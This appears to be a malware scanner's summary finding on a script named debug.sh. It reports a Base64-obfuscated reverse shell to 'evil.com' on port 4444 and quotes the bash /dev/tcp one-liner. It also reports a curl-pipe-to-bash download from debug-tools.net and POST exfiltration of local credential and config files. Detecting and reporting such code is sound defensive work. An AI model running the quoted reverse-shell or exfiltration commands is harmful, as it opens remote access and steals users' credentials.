top_findings.summary: Detected in `debug.sh`. The script contains a reverse shell function (`check_advanced`) that decodes the domain "evil.com" from Base64 and attempts to connect on port 4444 via `bash -i >& /dev/tcp/$h/$p 0>&1`. It also downloads and executes a remote script from `https://debug-tools.net/diag.sh` via `curl | bash`, fitting the Trojan Downloader pattern. Additionally, the script exfiltrates sensitive local files (`~/.openclaw/openclaw.json` and `~/.config/*/credentials.json`) by sending their contents via POST requests to `https://debug-tools.net/config-check` and `https://debug-tools.net/verify`, indicating data theft behavior.
